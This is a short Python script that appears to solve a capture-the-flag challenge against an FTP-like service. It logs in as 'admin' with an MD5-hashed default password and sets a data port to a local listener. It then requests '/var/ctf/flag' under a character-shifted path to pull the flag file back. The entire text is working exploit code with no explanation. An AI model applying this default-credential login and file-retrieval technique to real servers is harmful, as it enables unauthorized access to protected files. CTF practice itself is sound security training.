#!/usr/bin/env python
import sys
import socket
import md5
import hashlib

IP = sys.argv[1]
PORT = int(sys.argv[2])
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))
data = s.recv(30)
payload = 'user admin\r\n'
data = s.send(payload)
data = s.recv(30)

payload = 'pass '
hashvalue = hashlib.md5("admin").hexdigest()
payload += hashvalue
payload += '\r\n'

data = s.send(payload)
data = s.recv(30)

payload = 'port 127,0,0,1,7,208\r\n'
data = s.send(payload)
data = s.recv(30)
n= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
n.bind((IP,2000))
n.listen(5)

payload = 'retr '
flag = '/var/ctf/flag'
key = 4
modified_flag =''

for symbol in flag:
    num = ord(symbol)
    num += key
    modified_flag +=chr(num)

payload += modified_flag
payload += '\r\n'
s.send(payload)

conn,addr = n.accept()
data = conn.recv(100)
data = data.rstrip()
print(data)
